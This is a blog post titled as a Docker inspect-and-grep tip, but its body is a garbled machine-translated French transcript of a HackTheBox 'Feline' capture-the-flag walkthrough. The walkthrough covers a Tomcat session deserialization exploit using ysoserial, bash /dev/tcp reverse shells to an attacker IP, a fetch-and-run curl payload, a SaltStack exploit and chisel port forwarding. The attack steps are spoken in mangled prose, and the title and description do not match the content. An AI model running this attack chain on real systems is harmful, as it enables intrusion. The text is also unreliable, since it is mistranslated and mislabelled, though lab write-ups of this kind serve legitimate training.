---
ToReview: true
author: full
categories:
- docker
date: 2023-07-08
description: 'This isn’t so much a docker tip, as it is a jq tip. If you haven’t heard
  of jq, it is a great tool for parsing JSON from the command line. This also makes
  it a great tool to see what is happening in a container instead of having to use
  the –format specifier which I can never remember how to use exactly:'
image: https://sergio.afanou.com/assets/images/image-midres-15.jpg
lang: fr
layout: flexstart-blog-single
post_date: 2023-07-08
pretified: true
ref: inspectgrepdocker_1243
seo:
  links:
  - https://m.wikidata.org/wiki/Q15206305
tags: []
title: 'Astuce Docker : inspecter et grep'
transcribed: true
youtube_video: http://www.youtube.com/watch?v=2QdK7tQUFac
youtube_video_description: 00:00 - Intro 01:00 - Start of nmap digging into Version
  numbers of applications 04:00 - Finding Tomcat is an old version 06:00 ...
youtube_video_id: 2QdK7tQUFac
youtube_video_title: HackTheBox - Feline
---

#  Intro

ce qui se passe sur youtube c'est ipsec
je fais félin de hack the box qui
était une boîte super amusante qui impliquait trois
exploits principaux
le tout premier est une
attaque de désérialisation java contre apache
tomcat
et la première moitié de la vulnérabilité
est assez évidente vous  peut écrire dans le
système de fichiers
la deuxième partie n'est pas si évidente la
version de tomcat
a une traversée de répertoire réelle dans
le cookie comment il gère la session
et si vous faites cette traversée de répertoire
et pointez le cookie vers un fichier qui est sur le
disque
il le ferait  désérialisez-le et cela ouvre
un chemin d'attaque dans ce cas, c'est avec
la bibliothèque d'utilitaires communs
une fois que vous obtenez un shell dans la boîte, vous constatez
que le
sel est en cours d'exécution, ce qui est vulnérable à
la vulnérabilité de la pile de sel
, vous le faites donc et obtenez l'exécution du code
qui vous atterrit  sur une instance docker
et ce docker est configuré pour que
le socket docker soit disponible
sur cette instance, ce qui vous permet ensuite
d'interagir avec l'api docker pour
créer un nouveau conteneur h  ave lancez une
commande et montez également le disque hôte sur
lui-même,
donc avec tout ce qui est dit,
commençons toujours par le nmap



#  Start of nmap digging into Version numbers of applications

donc dash sc pour les scripts par défaut sv
énumérer les versions oh
a je vais mettre tous les formats mis dans le
répertoire nmap  et appelez-le félin
, puis l'adresse IP qui est 10 10
10 205.
peut prendre un certain temps à s'exécuter, donc je l'ai
déjà exécuté en regardant les résultats,
nous n'avons que trois ports ouverts, le
premier étant ssh
sur le port 22 et c'est un  serveur ubuntu
nous avons également http sur le port 8080
et il exécute apache tomcat9027
donc il y a deux choses que je veux faire dès le
départ la toute première chose
est simplement d'aller sur la page Web 101010
205
8080 et parce que c'est tomcat je veux
vérifier
pour les interfaces de gestion, je
vais donc essayer slash admin
manager et slash manager
html et le code d'état était toujours 404
qui n'est pas trouvé si c'était je pense
comme 403 interdit
alors je sais que cela a été chargé mais je ne
peux pas accéder  ça
c'est 404 ça veut dire euh
même avec li  ke cross-site request
forgery je ne pense pas que je serais en mesure d'
accéder à cette interface
si vous ne savez pas ce qu'est l'interface du gestionnaire
pour tomcat, il vous permet simplement de
télécharger des applications Web afin que vous puissiez simplement
télécharger un shell inversé  et obtenir une victoire rapide,
donc parce que toutes ces pages étaient 404, je ne vais
probablement
pas penser à abuser de l'
interface d'administration pour cette machine
maintenant la prochaine chose que je veux regarder est que
nous avons ouvert ssh
et apache tomcat donc le tomcat est un
numéro de version verbeux 9027,
ce qui signifie que nous pouvons probablement connaître le
jour exact de la sortie du logiciel pour
savoir s'il est obsolète ou non.
je suis sûr qu'il y a
probablement comme une version que nous ne pouvons pas
voir
oh voyons c'est probablement le
paquet
euh 2020 zéro trois trente
peut-être que c'est ça je ne suis en fait pas
positif
euh peut-être que ce 4 est la version
je me demande s'il y a  un 1 3 qui est aussi
en focal
euh ne ressemble pas  e c'est dans n'importe quoi
un deux pas là
donc je ne sais pas exactement
quand cela sera publié mais cela nous dit
que nous avons focal ici alors
peut-être que c'est cette version p je ne sais pas j'ai
besoin d'examiner plus en détail la
version ssh pour  découvrir où
j'allais là-bas,
mais nous pouvons modifier cela pour dire
euh c'est très probablement une boîte focale ubuntu
et peut-être que ssh était
sh peut-être de
euh 20 2003



#  Finding Tomcat is an old version

maintenant nous pouvons regarder ce tomcat donc neuf
zéro deux sept donc si nous
google apache
tomcat9027 euh, je vais rechercher le journal des modifications et
généralement, lorsque j'ai des numéros de version spécifiques,
j'ajoute toujours le journal des modifications à ma recherche,
car le journal des modifications est publié
lorsque la version est publiée et vous
pouvez généralement
extraire le nom de la version ou la date de la version.
la page
si elle n'est pas affichée ici vous pouvez
toujours vérifier comme la source xml
regarder vérifier la source html pour voir si
elle est dans les métadonnées
télécharger des images sur la page regarder
les données exif
ou aller dans le flux xml et regarder les
dates  la pos d'alimentation  ted
afin que nous puissions voir que 90227 est
sorti le 11 octobre 2019,
ce qui est assez ancien si l'on considère que
la prochaine version n'a pas été publiée en
général, cela peut arriver si ce n'est tout simplement
pas une version stable, il y a des
problèmes de sécurité, il y a un tas de raisons pour lesquelles
ils ne le feront tout simplement
pas  faire une version mais la prochaine est le
21 novembre 2019
et en revenant à notre nmap, nous savons que cette
machine est sortie vers
mars au moins parce que c'est la première
version pour cet
ubuntu ssh donc nous pouvons voir le 12 décembre
euh le 11 février j'accepterais probablement
le 11 février et arrêtez de creuser dans les
vulnérabilités de tomcat euh non publiées
puis le 16 mars donc euh
à neuf zéro trois trois ou
neuf zéro trois un, c'est quand je considérais que
tomcat était
relativement à jour si ce n'était pas
au-delà
alors ce serait génial  mais
être à partir de 2019 est vieux, surtout quand
cette machine a probablement été
publiée comme la période de juillet-septembre
,
alors sortons le
11 novembre 2019
et nous pouvons passer à notre joyeux chemin,
donc si t  il y avait un rce comme



#  Checking out the web page 

dans tomcat que vous n'avez pas besoin de creds ou
quoi que ce soit car je suppose que je le
saurais donc je ne vais pas aller
chercher tout ça sur Google à la
place je vais juste regarder cette
page maintenant  pour voir ce que nous avons
dès le départ, c'est juste un
seau de virus et nous avons un curseur ici
qui n'a pas vraiment trop d'
informations,
je sais que je peux cliquer sur ce troisième curseur d'une
manière ou d'une autre, nous y allons,
donc rien ici, donc je vais  cliquez sur
le service d'accueil et le blog pour voir à quoi ressemble chaque
page
euh la maison ressemble à l'
index
la seule chose que nous n'avons pas faite est un go
buster donc
puisque c'est tomcat je vais essayer
index.jsp il n'est pas trouvé
et puis nous avons index.html alors faisons
un mode go buster dir puis dash u
http
101010 205 port 8080 liste de mots
j'aime maintenant utiliser opt set list
euh découverte contenu web
radeau petits mots point texte
puis faisons euh tiret
x pour  arguments html je vais juste l'
appeler go buster
root dot log
donc nous avons un go bus qui dessine sur cette application
pendant que nous travaillons
la page d'accueil rien d'intéressant cette
page de services
dit que le seau de virus nous avons une place pour un
e-mail et un échantillon
, puis le blog revient au même si
je clique sur
lire plus je ne reçois vraiment rien
j'espérais que cela me donnerait
comme euh  le point d'interrogation du
blog équivaut à un numéro d'identification ou
quelque chose
, puis je pourrais essayer l'
injection sql ici, mais cela ne me donne pas
cela,
alors passons à cela,



#  Playing with the file upload, uploading an EICAR to test virus scanning

c'est un seau de virus et il semble qu'il
analyse les fichiers
donc le très  la première chose que je veux faire, c'est que
je vais chercher sur Google la chaîne de
test eicar et c'est juste une chaîne
qui est généralement
considérée comme un virus bien
virus, vous pouvez l'utiliser pour tester les
scanners de virus pour vous assurer qu'ils sont
réellement  analyser le fichier
afin que vous le mettiez là où les utilisateurs
peuvent télécharger des fichiers vers
une base de données peut-être certains fichiers sur la boîte
et d'autres choses et vous devriez avoir une
alerte antivirus
lorsqu'il l'analyse si ce n'est pas le cas, alors vous
connaissez votre virus  le scanner ne fonctionne
pas, c'est donc ce que l'eic  ar chaîne de test est
pour
donc nous allons le mettre là et je vous
recommande fortement de
ne pas faire le test e i actuel sur des endroits pour lesquels
vous n'avez pas la permission car
si vous faites un virus, pensez que la base de données
est
un si vous faites un  le scanner de virus pense que la
base de données est un virus,
il pourrait essayer de supprimer la base de données et de
mauvaises choses se produiraient,
alors n'essayez certainement pas de jouer avec
ces choses
htb et ensuite nous voulons faire du
texte eico félin et je vais également
intercepter cette demande  juste pour que nous puissions
voir à quoi cela ressemble
afin que nous obtenions une interception d'onglet proxy est en cours d'
analyse
et je vais envoyer cela au
répéteur
et tout semble bien dans ce domaine, donc je
vais juste
transmettre et la raison pour laquelle je voulais  le
transmettre n'est pas pour voir ce texte mais
aussi
généralement lorsque vous interagissez avec des pages,
nous n'avons pas de cookie ici,
nous obtenons un identifiant de session cookie j défini,
donc je suppose maintenant que ma future demande
aura ce cookie
qui m'est attribué donc  j'aime toujours
faire ce que je peux dans le navigateur pour faire
bien sûr, je reçois un cookie,
l'essentiel est qu'il indique que le fichier a été téléchargé
avec succès
et si nous regardons, désactivons la suite burp,
allons à 10 10 10 80, puis nous l'avons
attrapé  pour voir si nous pouvons le frapper
télécharge eico.text nous ne pouvons pas
revenir à notre go buster nous n'avons pas encore de
nouveaux répertoires
euh nous pouvons tester notre chaîne eicar à comme
virustotal.com
puis télécharger euh let's  allez
hdb feline si vous êtes curieux de savoir comment j'obtiens
cela comme
taper la barre vers le haut, j'appuie sur ctrl l pour le
faire,
nous téléchargeons eicar et vous pouvez voir
presque tout détecte cela comme un
virus, nous sommes 58 sur 63.
euh  on dirait que la dernière ligne pense que c'est un
cheval de Troie
qui fait peur malwarebytes ne le détecte
pas du
tout je ne sais pas ce que ces autres tous
mais
malwarebytes ne détectent pas c'est en
fait surprenant
euh celui que je veux vérifier est clam av
parce que c'est l'av commun
sur linux et nous n'avons pas vérifié si c'était
linux mais si je le ping 10
10 10 205  ce ttl
est 63 donc nous avons une route
entre un saut entre nous et la boîte donc c'est
ttl 64 ce qui signifie que c'est une variante Linux
euh si c'était 127 ici ce qui signifie 128
je penserais que ce serait une boîte Windows
donc
nous savons que c'est  linux et il ne semble pas
que
ce soit un drapeau dans cette voiture ei l'autre
chose que nous pourrions tester
est de changer le nom pour s'il vous plaît texte sous-
point et mettre um
whoops allez
merci et téléchargez ceci
parce que peut-être qu'il vient de dire que le fichier a été
téléchargé  et a été détecté comme un virus,
je veux dire que c'est toujours possible, c'est
pourquoi je teste celui-ci,
nous le testons sur 404 non trouvé
et allons ici, nous ne sommes pas trouvés non
plus, donc nous ne savons pas comment cette
pièce de téléchargement
fonctionne  peut essayer de fuzzer les choses afin que nous puissions mettre



#  Finding if we put a directory or nothing for filename we get an error message

euh
comme point point slash s'il vous plaît texte sous-point
et nous obtenons un nom de fichier invalide si nous
ne mettons rien du tout
nous mettrons comme point point qui serait un
répertoire nous obtenons cette
erreur étrange  message afin qu'ils ne masquent pas les
erreurs de notre part
et que nous puissions voir le euh je pense que
ca  ll trace ou stack trace tout ce que vous
voulez appeler cela et
le tout premier est une erreur apache commons
,
ce qui signifie qu'il y aura probablement une
désérialisation si nous pouvons l'obtenir
dans
les données de dcl et apache commons n'est qu'un
cadre super super commun comme  le nom
suggère que
je pense que si vous voulez faire même comme
base64 cette fonction est dans les communs apache
donc c'est juste le cadre commun qui
a beaucoup de
chaînes de désérialisation publiques ou de gadgets pour ça
euh tout a commencé comme je pense 2015
avec  ceci comme la sécurité des gants de renard euh ibm
websphere je pense d'abord ouais ou weblogic
euh weblogic et websphere je les
confonds trop
mais c'est un bon article à lire si vous ne
comprenez pas ce que
sont les attaques de désérialisation euh j'ai cette
vidéo de désérialisation php i '  Je recommande fortement
de regarder ces deux
intros
et celle avancée um
c'est un peu différent entre les
langues mais le concept de base est le
même
et je n'ai pas vraiment compris le
dese  rialization jusqu'à ce que je le démonte dans
un
langage facile à lire pour moi qui était
php
donc nous avons ceci qu'il n'a pas réussi à
écrire et c'est là que je vais
google comme les
volumes apache tomcat donc tomcat9027
vulnérabilité ou exploit et poc
voyons  ce qu'il trouve
redtimmy.com donc nous regardons ça
il y a un cve 2020



#  Looking at Tomcat exploits to see that we may be able to perform a deserialization attack by uploading a serialized object

8 9484 et je veux regarder ça c'est le
20 mai
2020. la raison pour laquelle je voulais regarder
ça est parce que je sais que la boîte a été
publiée
comme le juillet  période de septembre, donc
s'il s'agissait d'un cve de décembre,
je l'ignorerais probablement, puis
je le regarderais après avoir rooté la boîte parce que
l'exploit est sorti après sa
sortie, donc je n'étais pas censé le faire
le gestionnaire persistant et il utilise le
fichier  stocker les
gadgets dans le chemin de classe donc
le gadget dont il parle est
probablement ce
gestionnaire standard euh persistant
l'exploit donc nous envoyons l'identifiant de session j
pour ressembler à un lfi alors peut-être que l'
exploit lui-même nous permet de faire la
traversée de répertoire
et il automatiquement app  termine la session de points
donc sur ce disque euh si nous allons à
[Musique]
oh je ne l'ai pas ici mais allons-y
euh rafraîchir cette page appuyez simplement sur
entrer l'
interception est désactivée allumez-la
euh allons-y service
darn cache nous voyons ceci  donc sur cette boîte
probablement sur le système de fichiers local c'est une
pending.session et
ce sont les données de session pour cela
donc l'exploit dit que nous devons
trouver un moyen de déposer un objet sérialisé
sur le disque
et ensuite si nous l'incluons via  l'
identifiant de session
um nous pouvons obtenir l'exécution du code donc la toute
première chose que nous voulons faire
est de passer à yso
serial alors pourquoi donc github série et
l'essentiel à ce sujet je vais juste
pour cette demande mais l'essentiel à ce sujet
c'est quand vous allez ici que vous pensez peut-être que vous
voulez aller aux versions et télécharger
ceci c'est en fait le code source toujours
le binaire série yso réel
vous faites défiler vers le bas et allez au
lien jetpack et cela vous permettra de le télécharger
alors sauvons waiso  maître de tableau de bord série
et déplaçons-le alors déplacez-vous vers le bas  ads
wiser serial
dash master je vais juste l'appeler
yso serial.jar
et nous pouvons l'exécuter avec java jar
wiser serial et cela nous indique
une liste de tous les frameworks qu'il prend en charge
afin que nous ayons un tas de collections communes
nous revenons  à
notre message d'erreur, voyons
qu'il est dans le répéteur,
nous n'avons pas de numéro de version, nous pourrions
potentiellement tirer cette bibliothèque et regarder la
ligne 394 et obtenir un numéro de version,
mais c'est beaucoup de travail quand nous pourrions le
deviner.  nous allons aller deviner la version



#  Using ysoserial to generate a CommonsCollection payload

euh la toute première que je vais faire
est la collection commune sept qui est la
version
trois un euh
essayons les collections communes quatre
j'aime toujours commencer par le
numéro de version le plus élevé puis descendre
alors faisons commun  collections pour
et c'est exactement comme la commande dans laquelle il se
trouve ce n'est pas encore le
numéro de version les numéros de version
ici
donc les collections communes pour les collections communes de
céréales weisser pour
et ensuite nous voulons que le serveur fasse
quelque chose que
je n'aime pas faire c  urls parce que je veux dire
si vous
n'êtes pas assez de boîtes linux, vous réaliserez que
curl n'est pas toujours là w get n'est pas
toujours là c'est normalement l'un ou l'
autre
donc la seule chose qui va toujours
être sur la boîte est ping
donc je suis  va faire ping 10 10 14 4
puis tiret c1 pour le compte un et la
raison en
est que si cette application n'a pas de
thread et que vous ne le faites pas,
ce ping ne se termine pas, donc il
va constamment cingler votre boîte
et  aussi euh si quelqu'un fait un ps
ils sont comme pourquoi ma boîte ping ce
gars parce que
vous n'avez aucun moyen de le tuer donc c'est
pourquoi j'aime faire
ping dash c1 maintenant ça va vous donner
un tas de bric-à-brac



#  Showing a trick to copy binary content into BurpSuite

donc la seule chose  j'aime faire est de
faire la base 64 w0
et de l'obtenir dans une grande chaîne base64
, puis je peux également faire le presse-papiers de sélection de tiret x-clip,
donc maintenant, il ne va pas à
la sortie standard, allez directement dans mon presse
-papiers et nous pouvons coller et puis  utiliser burp suite
pour décoder whoops clic droit
convertir sélection base64 décoder ou
contrôler shift b
et ça devient  s mis ici euh il
ne devrait pas y avoir de saut de ligne à la fin de
ceci
mais si nous avons essayé de copier et coller
alors débarrassez-vous de tout cela
euh nous avons tous ces mauvais caractères euh
nous pouvons voir
les choses terminales par lesquelles ça commence comme
sr  et a un tas
de choses qui n'existent pas, nous pouvons essayer
d'aller directement dans un presse-papiers, donc le
presse-papiers de sélection
, puis lorsque nous collons, nous pouvons voir ce
personnage
qui est tout simplement mauvais afin que nous puissions voir
voici à quoi ressemble le début de cela
voici à quoi ressemble le début de cela
et si nous voyons cela en hexadécimal, voyons si
je peux le faire,
cela devrait commencer par aced alors
voyons euh
je suppose que copier le
décodeur encode comme hexadécimal
donc nous savons que c'est bien si je peux le
faire  à cette autre charge utile,
cela ne va pas être acé au moins je
ne pense pas que ce soit
euh ouais fdfd donc
ce n'est pas un objet sérialisé valide les
objets sérialisés commencent toujours par
acé
si nous allons à cette page de gant de renard uh
gant de renard sécurité
je '  Je suis sûr que ça va nous le dire si bien
oui pour que nous puissions le voir ici  commence par
ceci l'autre
est qu'ils disent aced puis
triple o cinq ou o cinq
euh c'est comme r0 a
b c'est un
objet java
a64 alors revenons à notre suite burp et
téléchargeons réellement ceci
et la seule chose que je vais faire  d'abord,
je vais écrire ceci sur mon disque
, puis le télécharger à nouveau
parce que je ne pense pas que ce type de contenu
corresponde maintenant à ce que sont ces données,
ce n'est certainement pas du texte clair, c'est
comme un flux d'octets ou des données binaires ou
quelque chose comme  que
donc ce que nous allons faire est simplement d'
écrire ceci à euh s'il vous plaît sub
dot session et ensuite
nous passons à notre page
root ipsec dot rocks sample
s'il vous plaît sub dot session envoyez-le à
burp suite
analysez-le téléchargez le fichier
[Musique]
nous n'avions pas d'interception afin que je puisse accéder
à l'historique http
et c'est tout, alors extrayez-le de
là,
fermez cela et nous dirons que le
téléchargement est correct, nous avons donc l'objet java
sur le disque
ce que je veux faire maintenant  est sudo tcp dump
dash i ton zero dash n don't do dns
icmp donc nous voulons pouvoir l  regardez
la requête icmp



#  Testing RCE by making the application ping us

et revenons simplement à cette page
ou peut-être pouvons-nous revenir à notre historique
tout ce que je veux faire
est d'
extraire une page qui a mon cookie
là nous allons donc
ici nous faisons
un tas de barres obliques n'est pas  peu importe
combien ont
juste besoin d'assez pour accéder au répertoire racine



#  Failing to get a reverse shell, going through a lot of issues, attempting to encode our command to avoid bad characters

, nous appellerons cet
exec et ensuite nous allons essayer une
chose très rapidement,
euh, nous allons appuyer sur ctrl x pour couper cela
parce que nous avons besoin de ce message d'erreur, optez pour les
téléchargements d'échantillons que j'ai fait  control
z que je pensais remettre cela
mais ce n'est pas le cas, donc je vais simplement le coller
et ensuite nous voulons copier ceci, le
mettre ici, puis s'il vous plaît, sous à
nouveau tomcat lui-même va ajouter
cette session de points et nous obtenons juste 200
donc nous le faisons rapidement, nous obtenons cette
erreur http status 500
et je regarde en arrière sur ma boîte et nous avons l'
exécution de code, donc cela
ressemble à des collections communes euh
je pense que les quatre charges utiles ont fonctionné alors maintenant
nous voulons obtenir un
shell inversé alors
voyons voir  je vais faire echo dash
n et on fera base 60 ou pas base64
euh ben bash das  h c
bash dash je dev tcp 10 10 14
4 9 000 1 0 et 1 comme ça
et puis fondamentalement pour ça
maintenant nous pouvons copier ceci
et la raison pour laquelle je fais cela est
juste pour éviter les mauvais caractères que je déteste
mettre comme des guillemets et tout  ces choses
dans mes charges utiles afin que nous puissions faire écho à cela,
puis base64
ou basiques le décoderaient puis l'
exécuteraient avec
bash donc nous l'avons juste écrit pour plaire
à la session sous-point
mais nous pouvons aussi euh convertir cela en
base64
puis xclip dash selection euh
presse-papiers  est ce que je veux
donc maintenant nous allons ici télécharger
cliquez sur
coller et puis c'était ctrl shift
whoops c'est u euh oh ctrl shift b
je vais juste le coller à nouveau j'appuie sur la
mauvaise touche
euh voyons control shift b on y va
donc
télécharger  et
nous avons fait quatre bonnes choses, je suis 14 4.
erreur de serveur interne ncl vmp 9001 et nous n'avons pas de
shell, nous pouvons donc essayer de le télécharger à
nouveau très rapidement
et rien de sorte que cela n'a pas fonctionné
euh, nous pouvons essayer de supprimer comme des espaces
alors essayons  que
faire cette technique d'expansion de l'accolade
euh je ne pense pas que cela ait besoin de t  chapeau
donc ce que je vais faire, c'est que nous allons
copier
je veux juste exécuter cette commande pour
m'assurer que cela fonctionne
euh 10 10 14 4
ne regarde pas oh je ne l'ai pas transmis sur
le
bash  on dirait que ma commande
ne fonctionne pas,
alors copions cette
pâte base64 base64-d
oh j'ai foiré mon shell inversé
dès le début
ah où est-ce que nous allons simplement le réécrire
ou peut-être que c'est ici euh
ouais zéro à
et un ou  c'est
que nous y allons c'est pourquoi j'ai oublié
alors echo
base64-d bash ici nous passons
en revue un shell fonctionne
afin que nous puissions remplacer
cela
par cette charge utile
et voir si cela fonctionne
si nous allons télécharger
j'ai essayé de coller là ça n'a tout simplement pas
fonctionné  alors collez à nouveau
puis ctrl shift b
upload exec et nous n'obtenons pas de shell
alors maintenant nous pouvons essayer la prochaine chose
qui
irait à l'expansion de l'accolade
pour voir si ce sont tous ces espaces qui
nous ennuient
alors maintenant une charge utile ne '  t avoir des espaces
et nous pouvons
tester une charge utile pour nous assurer qu'il
fonctionne toujours et j'espère
qu'il le fait
oui d  oes
donc c'est maintenant mon presse
-papiers et reviens pour télécharger
cliquez sur
coller
oh nous avons un mauvais caractère ici nous
allons
ctrl shift b upload
exec cela a pris une seconde cette fois mais nous
n'avons toujours pas de shell inversé donc
je sais qu'il y a un  moyen de le faire fonctionner
avec cela, mais
à un moment donné, j'aime juste tracer la
ligne et dire d'accord, je
complique trop cette charge utile
, passons à une charge plus simple, faisons



#  Attempting to use a different one-liner to get a shell

euh une fille de charge utile
10 10 14 4 slash
sample et dirigez-le vers
bash puis dans mon répertoire félin je
vais faire du dub dub
dub en simple et c'est là où on met
le one liner
devtcp 1010 14 4 9001
comme ça
ça a l'air bien j'exécute bash
débarrassons nous de ce bin bash
ah  je n'ai pas besoin de ce bash c en fait
parce que ce script curl est déjà
exécuté dans bash donc je sais que je vais
être dans ce shell
donc le bash c est un peu inutile
là nous allons python3 dash m
serveur http
faisons ça sur  port 8000 je suppose
qu'il est copié allons télécharger la
pâte
avait un mauvais caractère  les acteurs viennent toujours
sur ctrl shift b
téléchargé
exécuté euh
il a fait un get mais nous n'avons pas
encore de shell
donc curl localhost 8080
simple bash jeton inattendu
invalide
localhost 8080 simple
oh huit mille
là nous allons papier à bash
donc nous aurions dû avoir un  shell
alors peut-être qu'il n'aime tout simplement pas cette
syntaxe de shell inversée,
donc ce que nous pouvons faire euh
la feuille de triche du shell
enlevons la suite burp voyons en fait euh ce que nous pourrions faire cp simple.simple.back
v simple et nous revenons avec  notre ping
donc 1010 14 4 et nous voulons aussi nous
assurer que nous faisons toujours
dash c1
donc maintenant quand j'héberge ce serveur,



#  Giving up using one liners, sometimes two payloads are better than one. Downloading a script and then executing it.

il devrait nous envoyer un ping donc
sudo tcp dump ton zero
dash n
icmp si j'appelle ça
oh ça m'a probablement fait mal sur localhost
c'est pourquoi
j'espère que le
téléchargement s'exécute
donc il l'a obtenu mais nous n'avons pas de ping
donc il n'aime probablement pas la façon dont nous faisons
ce tuyau pour bash
donc ce que nous pouvons essayer est un tiret o
euh écrivons-le  à dev shm
s'il vous plaît travaillez donc
maintenant nous pouvons télécharger
coller
ce que nous allons
ctrl shift b
donc nous l'avons à nouveau donc maintenant il devrait être
sur la boîte
et maintenant je vais juste l'exécuter
donc nous faisons ce
bash de charge utile alors maintenant nous avons supprimé
tous les caractères spéciaux d'une demande
et nous nous sommes scindés en deux demandes
pas le  façon la plus élégante de le faire, mais
lorsque vous simplifiez les choses,
ils ont tendance à fonctionner plus souvent
et nous le faisons claquer, donc cela fonctionne
, copions
ce qu'il fait, s'il vous plaît,
travaillez simple et simple.
télécharger et
si je contrôle z cela quelques fois
on y va je pense que ça va être la
charge utile de téléchargement
donc on peut dire
télécharger
alors um
prep exec je suppose que je ne sais pas là on y
va
donc serveur web en cours d'exécution
reverse shell en cours d'exécution alors
téléchargez  exec alors maintenant, nous venons de télécharger
et d'écrire pour
s'il vous plaît travailler, puis nous pouvons préparer exec
à exec et nous obtenons un shell
qui fonctionne très
bien, donc c'était un long chemin à parcourir, mais
j'espère que vous avez trouvé comme
mon cadre et comment je fais inverser les shells
quand  j'ai de mauvais caractères
je suis sûr que si je  joué avec ça plus longtemps,
j'aurais pu le faire sans écrire sur le
disque,
mais je veux dire parfois,
vous voulez juste aller vite et écrire sur le
disque est le moyen de le faire,
alors obtenons un shell approprié, donc python 3
c import pty pty dot spawn
bin bash alors  stty
raw moins echo fg entrez deux fois
vous ne voyez pas euh vous tapez fg
mais cela fonctionne et ensuite nous pouvons exporter le
terme est égal à x terme afin que nous puissions effacer
l'écran
alors maintenant nous sommes sur cette boîte
la première chose que j'aime toujours  faire est d'
essayer d'établir un certain type de
persistance dans la machine, donc si mon
shell meurt,
je peux facilement revenir en arrière, donc je vais dans
mon répertoire personnel et crée un
répertoire ssh et nous obtenons l'autorisation refusée,
donc je ne peux pas supprimer une clé publique
nous  Je pourrais probablement maintenant télécharger un
jsp malveillant sur le serveur et le faire de
cette façon, mais si le serveur est réinitialisé,
nous perdons notre accès, donc je vais juste



#  Discovering Docker is running on this box

le
laisser tel quel et m'assurer que
j'ai toujours
mon téléchargement et préparation  exec payloads pour que je
puisse facilement récupérer un shell sur la
machine
le n  La prochaine chose que je veux faire est de m'assurer que
je suis là où je pense être,
donc je vais faire un ipaddr et
mon adresse IP est 101010 205, donc
je sais que je suis sur la boîte, il n'y avait aucun
type de bizarre  nadding
ou redirection de port ou des choses comme ça
, ce qui est bizarre, c'est
que nous avons une interface docker, donc
je vais faire un ls-le sur slash et
je ne vois pas dot docker n pour quoi que ce soit, donc
ça ne regarde pas  comme si nous étions dans un docker
mais on dirait que c'est un hôte docker
donc je vais exécuter docker ps et nous obtenons l'
autorisation refusée lorsque nous essayons de parler
au socket docker parce que je suppose que nous ne sommes
tout simplement pas membre du docker  groupe
si je fais un ls-la
à ce sujet, nous pouvons voir que root le possède et que
docker le possède, il peut lire directement
sur cette socket, ce qui explique comment docker fonctionne
euh, je suppose que la prochaine chose à faire serait de
regarder des trucs de redirection de port ou pas de
port  transfert mais
ouvrez simplement les ports pour voir s'il y a quelque chose
qui est
poussé vers le docker parce que je
ne peux pas regarder les dockers en cours d'exécution mais
parce que docker  est sur cette boîte, je suppose que
docker est en cours d'exécution
et qu'il y a probablement un type de redirection de port en
cours euh nous pourrions probablement
regarder iptables dash
l aussi avons-nous la permission de
euh non nous n'avons pas la permission de regarder les
tables IP
donc nous voyons  localhost 4505 4506
8000 et 44327 um
n'importe lequel de ces ports pourrait être
transmis au docker nous savons que 8080 n'est
pas parce que nous avons exporté cela et nous sommes
sur cette boîte
8005 pourrait également être mais je pense
que c'est le port ajp  qui est
le tomcat
comme le service de redirection de port donc rien
là-bas
euh 4506 4505 4506 et 8 000.
je vais boucler chacun de ceux-ci donc curl
localhost 4505
euh http lorsqu'il n'est pas autorisé
http 09 nous ne sommes pas autorisés et
faisons mille et  nous obtenons une réponse vide je
vais faire un
tiret v pour que je puisse voir l'en-tête du serveur
qui revient
euh nous n'obtenons rien peut-être que c'est ssl donc
je vais ajouter un tiret
k pour ne pas
vérifier le certificat et nous obtenons
quelque chose en
retour  est une application de tarte aux cerises,
je n'ai aucune idée de ce que je
Voyons,
bienvenue aux clients, le
coureur de sous-réseau local batch
ressemble à un type d'api
parce que nous n'obtenons pas de page réelle
, nous devons donc trouver exactement de
quel port il s'agit ou où il se trouve, alors
peut-être que si je fais une barre oblique de recherche et  puis
à devnol donc nous cachons des choses qui n'existent pas
et grep car
je prendrais un tiret i cherry p
y pour voir si nous pouvons le trouver la tarte aux cerises est un
peu comme un flacon
alors oui euh si je vais à slash opt
voyons des échantillons ceci  c'est là que nous
écrivons
voyons voir conteneur d autorisation refusée
je vais chercher sur google quel port 4505 et



#  Finding out SALT is running on this box, which did have an unauth RCE recently (Salt Stack)

4506
est 4505
voir il semble qu'il fasse partie du sel
et 45 ou six ainsi donc le sel
est un
système de gestion de contenu similaire et  pas cms euh
système de gestion des changements
euh cm donc gestion des changements ou devops ou des
choses comme ça
si vous êtes familier avec comme une
marionnette de chef ansible
il y en a quelques autres mais ce sont
les principaux
c'est juste des moyens pour les administrateurs de
gérer un tas de serveurs et  il y a eu
une vulnérabilité récente dans
ide of salt appelé je pense euh voyons l'
exploit de vulnérabilité du sel je pense que la
cabane à sel ou la
pile de sel est l'exploit,
donc pour exploiter ceci ou tester l'
exploit,
nous devons probablement transférer cette
boîte ou celle-ci vers notre boîte
nous  peut essayer de le faire simplement avec cette
charge utile, donc cela ressemble à un bon cve à
tester
afin que nous puissions essayer de le voir comme une
copie brute, je suppose que je pourrais probablement l'
obtenir,
alors revenons à notre serveur Web pour
commencer  dans w obtenir
ceci assurons-nous que c'est python
il est déplacé vers la
pile de sel point pi
puis cd dev shm et ensuite nous
allons wget 10
10 14 4 8 000
pile de sel tarte aux points python trois
tarte aux points de pile de sel voir si ça marche  euh
pas de sel de nom de module donc je vais revenir
à la façon dont j'ai fait cette tarte aux cerises
avec la découverte et je vais chercher la
tarte aux points de sel
afin que nous puissions voir que c'est dans les rapports sos de partage d'utilisateurs
je ne sais pas quoi  c'est
euh oeuf est-ce que j'ai le droit d'accès ici
je ne trouve pas.
v shm
et voir si ces bibliothèques sont sur la
boîte, je ne pense pas qu'elles le soient,
mais voyons ce qui se passe
euh pas de module nommé sos donc nous entrons
dans un tas de
problèmes de bibliothèque donc ce que nous devrions faire
est simplement exécuter la pile de sel  exploit sur
notre boîte
et cela fonctionne parce que je l'ai déjà exécuté
une fois
, j'ai donc installé pip3 salt pour me débarrasser de
cette
bibliothèque python um chose manquante euh peut-être
pseudo pip3 install salt oh mon dieu
et installe une bibliothèque fait mais ouais
cedar pip3 install
sel et cela vous permettra de
démarrer la prochaine chose que nous devons
faire est de
lancer chisel alors allons sur github
chisel et nous devons transférer certains ports
afin d'obtenir un clone euh nous n'obtenons pas de clone nous
voulons juste télécharger les
versions voyons voir  probablement linux amd
64.
enregistrer mv
télécharge ce qu'il appelait
chisel
puis gunzip dash d pour le décompresser
et j'aime toujours le renommer juste
chisel afin que je puisse l'exécuter facilement
obtenir la
commande
et télécharger le ciseau



#  Running chisel to forward SALT Ports which are listening on localhost (firewall bypass)

pour que nous puissions faire  port du serveur de ciseau
si nous ne spécifions pas de port euh
